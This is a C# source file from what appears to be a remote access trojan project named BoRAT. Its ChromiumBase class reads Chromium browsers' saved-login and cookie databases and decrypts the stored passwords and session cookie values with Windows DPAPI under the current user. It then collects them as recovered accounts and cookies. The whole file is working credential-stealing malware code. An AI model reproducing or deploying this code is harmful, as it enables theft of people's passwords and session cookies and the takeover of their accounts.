using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using BoRAT.Core.Data;
using BoRAT.Core.Recovery.Utilites;

namespace BoRAT.Core.Recovery.Browsers
{
    public class ChromiumBase
    {
        public static List<RecoveredAccount> Passwords(string datapath, string browser)
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            SQLiteHandler SQLDatabase = null;

            if (!File.Exists(datapath))
                return data;

            try
            {
                SQLDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception ex)
            {
                Console.Write("FSDFDS");
                return data;
            }

            if (!SQLDatabase.ReadTable("logins"))
                return data;

            string host;
            string user;
            string pass;
            int totalEntries = SQLDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    host = SQLDatabase.GetValue(i, "origin_url");
                    user = SQLDatabase.GetValue(i, "username_value");
                    pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));

                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
                    {
                        data.Add(new RecoveredAccount
                        {
                            URL = host,
                            Username = user,
                            Password = pass,
                            Application = browser
                        });
                    }
                }
                catch (Exception)
                {
                    // TODO: Exception handling
                }
            }

            return data;
        }
        public static List<Cookie> Cookies(string dataPath, string browser)
        {
            string datapath = dataPath;

            List<Cookie> data = new List<Cookie>();
            SQLiteHandler SQLDatabase = null;

            if (!File.Exists(datapath))
                return data;

            try
            {
                SQLDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return data;
            }
            if (!SQLDatabase.ReadTable("cookies"))
                return data;

            string host;
            string name;
            string value;
            string path;
            string expires;
            string lastaccess;
            bool secure;
            bool http;
            bool expired;
            bool persistent;
            bool priority;

            int totalEntries = SQLDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    host = SQLDatabase.GetValue(i, "host_key");
                    name = SQLDatabase.GetValue(i, "name");
                    value = Decrypt(SQLDatabase.GetValue(i, "encrypted_value"));
                    path = SQLDatabase.GetValue(i, "path");
                    expires = SQLDatabase.GetValue(i, "expires_utc");
                    lastaccess = SQLDatabase.GetValue(i, "last_access_utc");

                    secure = SQLDatabase.GetValue(i, "secure") == "1";
                    http = SQLDatabase.GetValue(i, "httponly") == "1";
                    expired = SQLDatabase.GetValue(i, "has_expired") == "1";
                    persistent = SQLDatabase.GetValue(i, "persistent") == "1";
                    priority = SQLDatabase.GetValue(i, "priority") == "1";


                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                    {
                        data.Add(new Cookie
                        {
                            HostKey = host,
                            Name = name,
                            Value = value,
                            Path = path,
                            ExpiresUTC = expires,
                            LastAccessUTC = lastaccess,
                            Secure = secure,
                            HttpOnly = http,
                            Expired = expired,
                            Persistent = persistent,
                            Priority = priority,
                            Browser = browser

                        });
                    }
                }
                catch (Exception)
                {

                }
            }

            return data;
        }
        private static string Decrypt(string EncryptedData)
        {
            if (EncryptedData == null || EncryptedData.Length == 0)
            {
                return null;
            }
            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
    }
}
